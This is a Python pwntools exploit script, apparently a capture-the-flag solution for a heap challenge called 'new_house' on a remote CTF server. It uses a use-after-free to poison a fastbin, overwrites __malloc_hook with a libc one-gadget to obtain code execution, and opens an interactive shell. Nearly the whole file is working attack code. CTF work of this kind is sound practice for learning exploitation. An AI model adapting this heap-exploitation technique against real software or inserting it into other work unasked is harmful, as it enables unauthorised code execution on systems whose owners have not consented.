# Strategy:
# * we get the libc base leak for free
# * overwrite libc+0x3aabf0 (&__malloc_hook) with libc+0x40e8a (onegadget)
# 
# For some reason the exploit only works ~ 1 out of 3 times, but that's good enough to get the flag!

from pwn import *

def add_room(name, size, prompt=True):
    print(f"Adding room {name} with size {size}")
    p.sendline(b'1')
    p.recvuntil(b'roomname? ')
    p.sendline(name)
    p.recvuntil(b'roomsize? ')
    p.sendline(str(size).encode())
    if prompt:
        p.recvuntil(b'>>> ')

def delete_room(n):
    print(f"Deleting room {n}")
    p.sendline(b'2')
    p.recvuntil(b'roomnumber? ')
    p.sendline(str(n).encode())
    p.recvuntil(b'>>> ')
    
def design_room(n, content):
    print(f"Designing room {n} with content {content}")
    p.sendline(b'3')
    p.recvuntil(b'roomnumber? ')
    p.sendline(str(n).encode())
    p.recvuntil(b'What goes into the room? ')
    p.sendline(content)

# p = process('./new_house')
# input("Attach a debugger? ")
p = remote('flu.xxx', 10170)

p.recvuntil(b'interesting in the ground: ')
libc = int(p.recvline().decode(), 16)
print(f"libc: 0x{libc:x}")
where = libc+0x3aabf0
print(f"where: 0x{where:x}")
what = libc+0x40e8a
p.recvuntil(b'>>> ')

alloc_size = 0x60

add_room(b'room0', alloc_size)
delete_room(0)
design_room(0, p64(where-0x23))  # So that the fastbin size is correct
add_room(b'room1', alloc_size)
add_room(b'room2', alloc_size)
payload = b'C' * (0x23-0x10) + p64(what)
design_room(2, payload)

# trigger onegadget
add_room(b'room3', alloc_size, prompt=False)

p.interactive()
